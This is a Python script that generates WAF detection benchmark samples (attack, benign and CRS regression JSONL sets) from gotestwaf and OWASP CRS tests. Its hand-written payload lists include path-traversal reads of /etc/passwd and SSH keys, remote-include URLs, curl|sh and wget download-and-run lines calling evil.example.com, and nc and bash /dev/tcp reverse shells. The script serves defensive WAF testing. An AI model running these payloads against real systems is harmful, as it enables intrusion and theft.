#!/usr/bin/env python3
"""生成 WAF 检测效果测试用的样本集（在开发机上运行一次，产物提交到 waf/samples/，压测机不需要运行本脚本）。

用法：gen_samples.py <gotestwaf 仓库目录> <coraza-coreruleset v4.25.0 模块目录> <输出目录>
依赖：PyYAML。

产物（JSON Lines，每行一个请求）：
  attack.jsonl          攻击样本：gotestwaf 测试集（MIT）按其占位符语义展开 + 本目录手写的经典载荷
  benign.jsonl          正常样本：gotestwaf false-pos 文本（MIT）+ 手写的正常请求（含容易误报的内容）
  crs-regression.jsonl  CRS 4.25.0 自带回归测试（Apache-2.0）中针对 PL1 规则、期望命中的用例，用于比较引擎一致性

每条样本字段：id、set（attack/benign/crs）、cat（类别）、src（来源）、place（载荷位置）、
method、path（原样发送的请求目标）、headers（[[名, 值], ...]，不含 Host/Content-Length/Connection，由发送端补）、
body（文本请求体）或 bodyB64（二进制请求体）。
"""
import base64
import glob
import hashlib
import json
import os
import re
import sys
import urllib.parse

import yaml

# 统一使用浏览器常见请求头，避免“缺少 Accept/UA”之类协议规则干扰攻击检测的统计
BROWSER_HEADERS = [
    ["User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"],
    ["Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],
    ["Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8"],
]


def rhex(*parts):
    """确定性的随机参数名（gotestwaf 用随机十六进制串，这里用哈希保证每次生成一致）。"""
    return hashlib.sha1("|".join(map(str, parts)).encode()).hexdigest()[:8]


def path_escape(s):
    """等价于 Go 的 url.PathEscape（gotestwaf 的 URL 编码器）：/ ; , ? 与非 ASCII 等需转义，$&+:=@ 保留。"""
    return urllib.parse.quote(s, safe="$&+:=@")


def js_unicode(s):
    """等价于 gotestwaf 的 JSUnicode 编码器：每个 UTF-16 码元写成 \\uXXXX。"""
    b = s.encode("utf-16-be")
    return "".join("\\u%02x%02x" % (b[i], b[i + 1]) for i in range(0, len(b), 2))


def multipart(fields, boundary=None):
    """生成 multipart/form-data 请求体。fields 为 [(名, 值, 文件名或 None, 内容类型或 None)]。"""
    boundary = boundary or "----GatelyBench" + rhex(*[f[0] for f in fields]) + "x7MA4YWxk"
    out = b""
    for name, value, filename, ctype in fields:
        out += b"--" + boundary.encode() + b"\r\n"
        disp = f'Content-Disposition: form-data; name="{name}"'
        if filename:
            disp += f'; filename="{filename}"'
        out += disp.encode() + b"\r\n"
        if ctype:
            out += f"Content-Type: {ctype}\r\n".encode()
        out += b"\r\n"
        out += value if isinstance(value, bytes) else value.encode()
        out += b"\r\n"
    out += b"--" + boundary.encode() + b"--\r\n"
    return out, "multipart/form-data; boundary=" + boundary


def sample(sid, sset, cat, src, place, method, path, headers=None, body=None):
    # 额外请求头与默认浏览器请求头同名时覆盖（如 User-Agent 载荷），避免同一请求头出现两次
    extra = headers or []
    names = {k.lower() for k, _ in extra}
    merged = [h for h in BROWSER_HEADERS if h[0].lower() not in names] + extra
    s = {"id": sid, "set": sset, "cat": cat, "src": src, "place": place, "method": method, "path": path,
         "headers": merged}
    if body is not None:
        if isinstance(body, bytes):
            try:
                s["body"] = body.decode("utf-8")
            except UnicodeDecodeError:
                s["bodyB64"] = base64.b64encode(body).decode()
        else:
            s["body"] = body
    return s


def place_payload(place, payload, key):
    """按 gotestwaf 的占位符语义构造请求，返回 (method, path, 额外请求头, 请求体)；不支持时返回 None。"""
    name = rhex(key, place)
    if place == "URLParam":
        return "GET", f"/?{name}={payload}", [], None
    if place == "URLPath":
        return "GET", "/" + payload, [], None
    if place == "Header":
        if re.search(r"[\r\n\x00]", payload):
            return None
        return "GET", "/", [["X-" + name, payload]], None
    if place == "UserAgent":
        if re.search(r"[\r\n\x00]", payload):
            return None
        return "GET", "/", [["User-Agent", payload]], None
    if place == "HTMLForm":
        return "POST", "/", [["Content-Type", "application/x-www-form-urlencoded"]], f"{name}={payload}"
    if place == "HTMLMultipartForm":
        body, ctype = multipart([(name, payload, None, None)])
        return "POST", "/", [["Content-Type", ctype]], body
    if place == "JSONRequest":
        return "POST", "/", [["Content-Type", "application/json"]], '{"test": true, "%s": "%s"}' % (name, js_unicode(payload))
    if place == "XMLBody":
        return "POST", "/", [["Content-Type", "application/xml"]], payload
    return None


def load_yaml(path):
    text = open(path, encoding="utf-8").read()
    # gotestwaf 部分文件在双引号字符串里写了 \'，Go 的 YAML 解析器容忍、PyYAML 不容忍，这里先替换掉
    text = text.replace("\\'", "'")
    return yaml.safe_load(text)


CAT_MAP = {
    "SQL Injection": "sqli", "128KB SQL Injection": "sqli", "8KB SQL Injection": "sqli",
    "XSS": "xss", "8KB XSS": "xss",
    "RCE": "rce", "8KB RCE": "rce", "Shell": "rce",
    "Path Traversal": "lfi", "LFI": "lfi",
    "CRLF Injection": "crlf", "LDAP Injection": "ldap", "Mail Injection": "mail",
    "NoSQL Injection": "nosql", "SS Injection": "ssi", "SST Injection": "ssti",
    "XXE": "xxe", "UserAgent": "scanner-ua", "REST": "api-mixed",
}


def gotestwaf_attacks(root):
    out = []
    files = sorted(glob.glob(os.path.join(root, "testcases", "owasp", "*.yml")) +
                   glob.glob(os.path.join(root, "testcases", "owasp-api", "rest.yml")) +
                   glob.glob(os.path.join(root, "testcases", "community", "*.yml")))
    for f in files:
        rel = os.path.relpath(f, root)
        d = load_yaml(f)
        typ = d.get("type")
        # 16KB 及以上的超长载荷不纳入：部分实现按请求体上限拒绝，测的是体积而不是检测能力
        if re.match(r"(16|32|64|128)KB", str(typ)):
            continue
        cat = CAT_MAP.get(typ)
        if cat is None:
            continue
        encs = [e for e in d.get("encoder", []) if e in ("Plain", "URL")]
        places = [p for p in d.get("placeholder", []) if isinstance(p, str)]
        for i, p in enumerate(d.get("payload") or []):
            p = str(p)
            for enc in encs:
                pe = path_escape(p) if enc == "URL" else p
                for pl in places:
                    r = place_payload(pl, pe, f"{rel}#{i}")
                    if r is None:
                        continue
                    m, path, hdr, body = r
                    sid = f"gtw-{cat}-{rhex(rel, i, enc, pl)}"
                    out.append(sample(sid, "attack", cat, f"gotestwaf:{rel}#{i}/{enc}", pl, m, path, hdr, body))
    return out


# 手写的经典攻击载荷（公开常见写法，用于补足 LFI/RFI、命令注入与扫描器 UA 的数量）
HAND_LFI = [
    "../../../../etc/passwd", "....//....//....//etc/passwd", "/etc/shadow", "..%2f..%2f..%2fetc%2fpasswd",
    "../../../../../../windows/win.ini", "..\\..\\..\\..\\boot.ini", "/proc/self/environ", "/proc/self/cmdline",
    "php://filter/convert.base64-encode/resource=index.php", "php://input", "file:///etc/passwd",
    "expect://id", "zip://shell.jpg%23payload.php", "/var/log/apache2/access.log", "../../../../etc/hosts%00",
    "C:\\Windows\\System32\\drivers\\etc\\hosts", "/.ssh/id_rsa", "../.env", "/WEB-INF/web.xml", "../../.git/config",
]
HAND_RFI = [
    "http://evil.example.com/shell.txt?", "https://203.0.113.9/r57.txt", "ftp://evil.example.com/backdoor.php",
    "http://198.51.100.7/c99.php?cmd=id", "//evil.example.com/inc.php", "http://evil.example.com/x.txt%00",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
]
HAND_RCE = [
    "; cat /etc/passwd", "| id", "&& whoami", "`uname -a`", "$(curl http://evil.example.com/x.sh|sh)",
    "; wget http://evil.example.com/bot -O /tmp/b; chmod +x /tmp/b; /tmp/b", "|| nc -e /bin/sh 203.0.113.5 4444",
    "; bash -i >& /dev/tcp/203.0.113.5/4444 0>&1", "& ping -n 3 127.0.0.1 &", "; powershell -enc SQBFAFgA",
    "${jndi:ldap://evil.example.com/a}", "; python -c 'import os;os.system(\"id\")'", "|/bin/ls -al",
    "; rm -rf /tmp/*", "<?php system($_GET['c']); ?>",
]
HAND_SCANNER_UA = [
    "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)", "sqlmap/1.8.4#stable (https://sqlmap.org)",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)", "masscan/1.3 (https://github.com/robertdavidgraham/masscan)",
    "WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)", "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)",
    "Mozilla/5.0 (compatible; Acunetix-Product/14.0)", "Arachni/v1.5.1", "gobuster/3.6", "Mozilla/5.0 Nessus",
    "w3af.org", "Fuzz Faster U Fool v2.1.0-dev", "zgrab/0.x", "Wfuzz/3.1.0", "commix/v3.9 (https://commixproject.com)",
]


def hand_attacks():
    out = []
    groups = [("lfi", HAND_LFI, ["file", "page", "template"]), ("rfi", HAND_RFI, ["url", "include", "page"]),
              ("rce", HAND_RCE, ["host", "cmd", "ip"])]
    for cat, payloads, names in groups:
        for i, p in enumerate(payloads):
            name = names[i % len(names)]
            q = urllib.parse.quote(p, safe="/:")
            out.append(sample(f"hand-{cat}-q{i}", "attack", cat, "handwritten", "URLParam", "GET", f"/index.php?{name}={q}"))
            out.append(sample(f"hand-{cat}-f{i}", "attack", cat, "handwritten", "HTMLForm", "POST", "/index.php",
                              [["Content-Type", "application/x-www-form-urlencoded"]], f"{name}={urllib.parse.quote_plus(p)}&submit=1"))
            out.append(sample(f"hand-{cat}-j{i}", "attack", cat, "handwritten", "JSONRequest", "POST", "/api/v1/run",
                              [["Content-Type", "application/json"]], json.dumps({name: p, "async": False})))
    for i, ua in enumerate(HAND_SCANNER_UA):
        out.append(sample(f"hand-scanner-{i}", "attack", "scanner-ua", "handwritten", "UserAgent", "GET", "/", [["User-Agent", ua]]))
    return out


def gotestwaf_benign(root):
    out = []
    f = os.path.join(root, "testcases", "false-pos", "texts.yml")
    rel = os.path.relpath(f, root)
    d = load_yaml(f)
    for i, p in enumerate(d.get("payload") or []):
        if p is None:
            continue
        p = str(p)
        pe = path_escape(p)
        for pl in d.get("placeholder", []):
            r = place_payload(pl, pe, f"{rel}#{i}")
            if r is None:
                continue
            m, path, hdr, body = r
            out.append(sample(f"gtw-fp-{rhex(rel, i, pl)}", "benign", "gotestwaf-fp", f"gotestwaf:{rel}#{i}/URL", pl, m, path, hdr, body))
    return out


# 容易误报的正常内容：技术文章、代码片段、带 SQL/Shell 关键字的普通文本、HTML 片段
TECH_TEXTS = [
    "Please select the best option from the menu, then update your profile and delete old drafts.",
    "Union Station is where we meet, then select a table near the window.",
    "We ordered by price and grouped by category; the drop in sales was minor.",
    "SQL 入门：SELECT name, age FROM users WHERE age > 18 ORDER BY age DESC;",
    "To count rows use SELECT COUNT(*) FROM orders; to join use LEFT JOIN customers ON orders.cid = customers.id",
    "Tip: in PostgreSQL, `INSERT ... ON CONFLICT DO NOTHING` avoids duplicate key errors.",
    "My favourite query: UPDATE products SET stock = stock - 1 WHERE id = 42;",
    "Can someone explain the difference between UNION and UNION ALL in MySQL 8?",
    "The 'or' operator returns true if either side is true, e.g. a or b.",
    "O'Reilly's book \"SQL Cookbook\" is great; chapter 3 covers joins.",
    "I'm using Python: for i in range(10): print(i)",
    "def handler(event, context):\n    return {'statusCode': 200, 'body': json.dumps(event)}",
    "const total = items.reduce((sum, x) => sum + x.price, 0); console.log(total);",
    "function debounce(fn, ms) { let t; return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), ms); }; }",
    "In Go: if err != nil { return fmt.Errorf(\"open: %w\", err) }",
    "public static void main(String[] args) { System.out.println(\"Hello\"); }",
    "Run `npm install` and then `npm run build` to produce the dist folder.",
    "To list files use ls -la, to see disk usage use df -h, and to find big files use du -sh *.",
    "Install with: curl -fsSL https://get.example.com | sh  (review the script first!)",
    "git checkout -b feature/login && git commit -am \"wip\" && git push origin HEAD",
    "docker run -d --name web -p 8080:80 nginx:alpine",
    "Our cron entry: 0 3 * * * /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1",
    "Use <b>bold</b> and <i>italic</i> tags for emphasis in the old editor.",
    "Embed the video with an <iframe> from the share menu; size 560x315.",
    "The <script> tag should be placed before </body> for faster rendering.",
    "Markdown: **bold**, _italic_, [link](https://example.com/docs?page=2&lang=en)",
    "Email me at alice.wang+news@example.com or call +86 138 0013 8000.",
    "Price: $1,299.00 (20% off) & free shipping; offer ends 2026-12-31.",
    "Formula: =SUM(A1:A10)/COUNT(B1:B10) gives the average.",
    "The path C:\\Program Files\\App\\config.ini holds the settings.",
    "Config lives in /etc/myapp/config.yaml and logs in /var/log/myapp/.",
    "我想查询 2025 年 select 系列耳机的价格，以及 union 品牌的售后政策。",
    "请帮我把 SELECT * FROM 表 改成只查需要的字段，避免全表扫描。",
    "这段 Shell 怎么写：for f in *.log; do gzip \"$f\"; done",
    "1 = 1 is always true, and 1 = 2 is always false in boolean logic.",
    "Rock & roll; drop by anytime -- we're open until 10pm.",
    "The admin panel shows 'Error: user not found' when the email is wrong.",
    "JSON example: {\"id\": 1, \"tags\": [\"a\", \"b\"], \"active\": true}",
    "Regex for email: ^[\\w.+-]+@[\\w-]+\\.[\\w.]+$",
    "XPath: //div[@class='item']/a/@href selects all item links.",
    "The template uses {{ user.name }} and {% if user.admin %} blocks.",
    "Set PATH=$PATH:/usr/local/go/bin in your ~/.bashrc file.",
    "Windows tip: dir /s *.txt lists text files recursively; type file.txt prints it.",
    "Use `exec` sparingly in shell scripts; `eval` is even riskier.",
    "Our API returns 404 when the resource is missing and 409 on conflict.",
    "C++: std::vector<int> v{1,2,3}; for (auto& x : v) x *= 2;",
    "Rust: let s = String::from(\"hello\"); println!(\"{}\", s.len());",
    "PHP: echo htmlspecialchars($name, ENT_QUOTES, 'UTF-8');",
    "The onload event fires after the page finishes loading all images.",
    "Alert: the meeting moved to 3pm; please confirm by replying.",
    "Drop table tennis practice to Thursday? Select players by Monday.",
    "Who wrote 'Waiting for Godot'? -- Samuel Beckett, 1953.",
    "Kubernetes: kubectl get pods -n prod | grep web",
    "Nginx: location /api/ { proxy_pass http://127.0.0.1:3000; }",
    "SELECT is a keyword; so are FROM, WHERE, GROUP BY and HAVING.",
    "Use --dry-run to preview changes before applying them.",
    "Our address: 1/F, No. 8 Science Ave; zip 510000.",
    "The equation x = (a + b) * c / 2 - 1 holds when c > 0.",
    "Search tips: use \"quotes\" for phrases and -word to exclude words.",
    "React: useEffect(() => { fetch('/api/items').then(r => r.json()).then(setItems); }, []);",
]

# 浏览器不会把 URL 片段（#...）发给服务器，这里的路径都不带片段
BROWSE = [
    "/", "/index.html", "/about", "/blog/2026/11/how-we-scaled-our-api", "/static/js/app.3f2a9c1b.js",
    "/static/css/main.8d1e.css", "/images/logo@2x.png", "/favicon.ico", "/robots.txt", "/sitemap.xml",
    "/api/v1/users?page=2&limit=20&sort=-created_at", "/api/v1/orders?status=paid&from=2026-01-01&to=2026-06-30",
    "/search?q=%E6%9C%BA%E6%A2%B0%E9%94%AE%E7%9B%98&page=1", "/search?q=best+laptop+2026&sort=price_asc",
    "/products/12345?ref=homepage&utm_source=newsletter&utm_medium=email&utm_campaign=nov",
    "/docs/getting-started", "/user/alice/settings", "/dashboard?tab=overview&range=7d",
    "/api/v2/metrics?names=cpu,mem,disk&step=60&start=1763300000&end=1763386400",
    "/download/report-2026-q3.pdf", "/category/books/programming?lang=en&min=10&max=50",
    "/news?tag=ai&tag=cloud&page=3", "/tags/c%2B%2B", "/wiki/SQL_injection", "/wiki/Cross-site_scripting",
    "/map?lat=23.1291&lng=113.2644&zoom=12", "/calendar/2026-12?view=month", "/feed.xml", "/manifest.webmanifest",
    "/api/v1/search?q=select+chair+for+office", "/api/v1/search?q=union+jack+t-shirt", "/forum/t/12345?page=2",
    "/share?url=https%3A%2F%2Fexample.com%2Fpost%2F1&title=Hello%20World", "/login?next=%2Fdashboard",
    "/oauth/callback?code=4%2F0AfJohXk&state=af0ifjsldkj&scope=openid+email",
    "/api/v1/files?path=%2Fphotos%2F2026%2Ftrip", "/gallery/%E5%B9%BF%E5%B7%9E%E5%A1%94.jpg",
    "/video/watch?v=dQw4w9WgXcQ&t=42s", "/cart?coupon=SAVE10", "/checkout/step/2",
]


def hand_benign():
    out = []
    jwt = ("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsaWNlIiwiaWF0IjoxNzYzMzAwMDAwfQ."
           "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c")
    cookies = "session=8f2b1c9e7d6a4b3c; _ga=GA1.1.123456789.1763300000; lang=zh-CN; theme=dark"
    # 1. 普通浏览：静态资源、带参数的 API、搜索、跳转参数等，交替带 Cookie、Referer 与 Bearer 令牌
    for i, p in enumerate(BROWSE):
        hdr = []
        if i % 3 == 0:
            hdr.append(["Cookie", cookies])
        if i % 3 == 1:
            hdr.append(["Referer", "https://bench.test/index.html"])
        if i % 4 == 2:
            hdr.append(["Authorization", "Bearer " + jwt])
        if p.startswith("/api/"):
            hdr.append(["Accept", "application/json"])
        out.append(sample(f"hand-browse-{i}", "benign", "browse", "handwritten", "URL", "GET", p, hdr))
    # 2. JSON API：常见增改请求
    apis = [
        ("POST", "/api/v1/users", {"name": "Alice Wang", "email": "alice@example.com", "age": 30, "tags": ["admin", "beta"]}),
        ("PUT", "/api/v1/users/42", {"name": "Bob", "bio": "Backend developer. Loves Go & Rust.", "website": "https://bob.example.com"}),
        ("PATCH", "/api/v1/users/42", {"settings": {"theme": "dark", "notifications": {"email": True, "sms": False}}}),
        ("POST", "/api/v1/orders", {"items": [{"sku": "A-100", "qty": 2, "price": 19.9}, {"sku": "B-7", "qty": 1, "price": 5}], "coupon": None}),
        ("POST", "/api/v1/login", {"username": "alice", "password": "S3cure!Pass#2026", "remember": True}),
        ("POST", "/api/v1/comments", {"postId": 991, "text": "Great article, thanks! 👍 我学到了很多。"}),
        ("POST", "/api/v1/events", {"type": "page_view", "url": "https://bench.test/products/1?ref=home", "ts": 1763386400123}),
        ("POST", "/api/v1/search", {"query": "wireless keyboard", "filters": {"price": {"min": 100, "max": 500}, "brand": ["Logi", "Keychron"]}}),
        ("PUT", "/api/v1/docs/7", {"title": "Q3 report", "content": "# Summary\n\nRevenue grew 12%.\n\n- item 1\n- item 2"}),
        ("POST", "/api/v1/webhooks", {"url": "https://hooks.example.com/notify?token=abc123", "events": ["order.paid", "order.refunded"]}),
        ("POST", "/graphql", {"query": "query($id: ID!) { user(id: $id) { name email posts(first: 5) { title } } }", "variables": {"id": "42"}}),
        ("POST", "/api/v1/address", {"line1": "1/F, No. 8 Science Ave", "city": "Guangzhou", "zip": "510000", "phone": "+86-138-0013-8000"}),
        ("POST", "/api/v1/feedback", {"rating": 4, "comment": "The select box on the settings page is hard to use on mobile."}),
        ("POST", "/api/v1/translate", {"from": "en", "to": "zh", "text": "Drop me a line when you are free."}),
        ("POST", "/api/v1/devices", {"mac": "AA:BB:CC:DD:EE:FF", "ip": "192.168.1.20", "name": "living-room-tv"}),
        ("POST", "/api/v1/schedule", {"cron": "0 3 * * *", "task": "backup", "enabled": True}),
        ("PATCH", "/api/v1/items/5", {"op": "replace", "path": "/price", "value": 29.99}),
        ("POST", "/api/v1/upload-meta", {"filename": "IMG_2026.HEIC", "size": 3456789, "mime": "image/heic"}),
        ("POST", "/api/v1/query", {"metric": "http_requests_total", "range": "5m", "groupBy": ["status", "route"]}),
        ("DELETE", "/api/v1/sessions/abc123", None),
    ]
    for i, (m, p, obj) in enumerate(apis):
        hdr = [["Accept", "application/json"], ["Authorization", "Bearer " + jwt]]
        body = None
        if obj is not None:
            hdr.append(["Content-Type", "application/json"])
            body = json.dumps(obj, ensure_ascii=False)
        out.append(sample(f"hand-api-{i}", "benign", "api-json", "handwritten", "JSONRequest", m, p, hdr, body))
    # 3. 技术内容：同一段文本分别作为表单字段、JSON 字段与查询参数提交
    for i, t in enumerate(TECH_TEXTS):
        out.append(sample(f"hand-tech-f{i}", "benign", "tech-content", "handwritten", "HTMLForm", "POST", "/forum/post",
                          [["Content-Type", "application/x-www-form-urlencoded"]],
                          urllib.parse.urlencode({"title": f"Question {i}", "content": t, "csrf": "a1b2c3d4"})))
        out.append(sample(f"hand-tech-j{i}", "benign", "tech-content", "handwritten", "JSONRequest", "POST", "/api/v1/notes",
                          [["Content-Type", "application/json"]], json.dumps({"title": f"Note {i}", "body": t}, ensure_ascii=False)))
        if len(t) < 160 and "\n" not in t:
            out.append(sample(f"hand-tech-q{i}", "benign", "tech-content", "handwritten", "URLParam", "GET",
                              "/search?" + urllib.parse.urlencode({"q": t})))
    # 4. 表单与上传
    forms = [
        {"username": "alice", "password": "p@ss w0rd!", "remember": "on"},
        {"email": "bob@example.com", "name": "Bob Lee", "message": "Hi, I'd like a quote for 20 units. Thanks!"},
        {"q": "how to reset router", "lang": "zh-CN"},
        {"title": "周末去爬白云山", "body": "早上 8 点集合，带水和防晒。", "tags": "户外,广州"},
        {"amount": "199.00", "currency": "CNY", "note": "Order #2026-1118-001"},
    ]
    for i, f in enumerate(forms):
        out.append(sample(f"hand-form-{i}", "benign", "form", "handwritten", "HTMLForm", "POST", "/submit",
                          [["Content-Type", "application/x-www-form-urlencoded"], ["Cookie", cookies]], urllib.parse.urlencode(f)))
    png = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==")
    uploads = [
        [("title", "avatar", None, None), ("file", png, "avatar.png", "image/png")],
        [("desc", "meeting notes", None, None), ("file", "Agenda:\n1. budget\n2. hiring\n", "notes.txt", "text/plain")],
        [("file", "name,age\nalice,30\nbob,25\n", "users.csv", "text/csv")],
        [("doc", "# Readme\n\nRun `make build` then `./app --port 8080`.\n", "README.md", "text/markdown")],
    ]
    for i, fields in enumerate(uploads):
        body, ctype = multipart(fields)
        out.append(sample(f"hand-upload-{i}", "benign", "form", "handwritten", "HTMLMultipartForm", "POST", "/upload",
                          [["Content-Type", ctype]], body))
    return out


def crs_regression(mod):
    """从 coraza-coreruleset 自带的 CRS 回归测试中取 PL1 规则、期望命中的单阶段用例。"""
    rules = os.path.join(mod, "rules", "@owasp_crs")
    pl = {}
    for conf in glob.glob(os.path.join(rules, "*.conf")):
        text = open(conf, encoding="utf-8").read()
        # 按规则块切分，找 id 与 paranoia-level 标签
        for block in re.split(r"\n(?=Sec(?:Rule|Action) )", text):
            m = re.search(r"\bid:(\d+)", block)
            if not m:
                continue
            t = re.search(r"tag:'paranoia-level/(\d)'", block)
            pl[int(m.group(1))] = int(t.group(1)) if t else 0
    out = []
    skipped = {"multiStage": 0, "encoded": 0, "noAuto": 0, "host": 0, "notPL1": 0, "noExpect": 0, "version": 0}
    for f in sorted(glob.glob(os.path.join(mod, "tests", "*", "*.yaml"))):
        d = yaml.safe_load(open(f, encoding="utf-8"))
        if not d:
            continue
        rid = d.get("rule_id")
        if pl.get(rid) != 1:
            skipped["notPL1"] += len(d.get("tests") or [])
            continue
        for t in d.get("tests") or []:
            st = t.get("stages") or []
            if len(st) != 1:
                skipped["multiStage"] += 1
                continue
            inp = st[0].get("input", {})
            outp = st[0].get("output", {})
            exp = (outp.get("log") or {}).get("expect_ids") or outp.get("expect_ids")
            if not exp:
                skipped["noExpect"] += 1
                continue
            if inp.get("encoded_request") or inp.get("raw_request"):
                skipped["encoded"] += 1
                continue
            if inp.get("autocomplete_headers") is False:
                skipped["noAuto"] += 1
                continue
            ver = inp.get("version", "HTTP/1.1")
            if ver not in ("HTTP/1.1", "HTTP/1.0"):
                skipped["version"] += 1
                continue
            headers = inp.get("headers") or {}
            # 被测程序按域名 bench.test 选站点，Host 统一改写；原用例依赖 Host 内容的跳过
            host = headers.get("Host", "localhost")
            if host != "localhost":
                skipped["host"] += 1
                continue
            hdr = [[k, str(v)] for k, v in headers.items() if k.lower() not in ("host", "content-length", "connection")]
            data = inp.get("data")
            if data is not None and not any(k.lower() == "content-type" for k, _ in hdr):
                # 与 go-ftw 的自动补全一致：有请求体且没有类型时按表单提交
                hdr.append(["Content-Type", "application/x-www-form-urlencoded"])
            s = {"id": f"crs-{rid}-{t.get('test_id')}", "set": "crs", "cat": os.path.basename(os.path.dirname(f)),
                 "src": f"coraza-coreruleset v4.25.0 tests/{os.path.basename(os.path.dirname(f))}/{os.path.basename(f)}#{t.get('test_id')}",
                 "place": "ftw", "method": inp.get("method", "GET"), "path": str(inp.get("uri", "/")),
                 "headers": hdr, "version": ver, "expect": exp, "rawHeaders": True}
            if data is not None:
                s["body"] = str(data)
            out.append(s)
    return out, skipped


def write(path, rows):
    with open(path, "w", encoding="utf-8") as f:
        for r in rows:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")


def main():
    gtw, mod, outdir = sys.argv[1:4]
    os.makedirs(outdir, exist_ok=True)
    attacks = gotestwaf_attacks(gtw) + hand_attacks()
    benign = gotestwaf_benign(gtw) + hand_benign()
    crs, skipped = crs_regression(mod)
    # 去重（同一请求只保留一次）
    def dedup(rows):
        seen, out = set(), []
        for r in rows:
            k = (r["method"], r["path"], json.dumps(r["headers"]), r.get("body"), r.get("bodyB64"))
            if k not in seen:
                seen.add(k)
                out.append(r)
        return out
    attacks, benign, crs = dedup(attacks), dedup(benign), dedup(crs)
    write(os.path.join(outdir, "attack.jsonl"), attacks)
    write(os.path.join(outdir, "benign.jsonl"), benign)
    write(os.path.join(outdir, "crs-regression.jsonl"), crs)
    from collections import Counter
    print("attack", len(attacks), dict(Counter(r["cat"] for r in attacks)))
    print("benign", len(benign), dict(Counter(r["cat"] for r in benign)))
    print("crs", len(crs), "skipped", skipped)


if __name__ == "__main__":
    main()
